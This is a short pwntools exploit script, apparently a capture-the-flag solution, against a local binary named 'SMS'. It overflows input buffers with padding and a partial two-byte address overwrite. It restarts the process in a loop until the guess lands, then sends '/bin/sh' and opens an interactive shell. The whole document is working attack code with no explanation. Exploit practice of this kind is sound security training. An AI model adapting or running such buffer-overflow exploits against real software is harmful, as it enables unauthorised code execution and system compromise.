#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
count = 0
while True:
	count += 1
	print count
	p = process('./SMS')
	print p.recv()
	p.sendline('A'*40 + '\xca')
	print p.recv()
	p.sendline('A'*200 + '\x01\x49')
	print p.recv()
	try:
		p.recv(timeout=1)
	except EOFError:
		p.close()
		continue
	else:
		sleep(0.1)
		p.sendline('/bin/sh\x00')
		sleep(0.1)
		break
p.interactive()
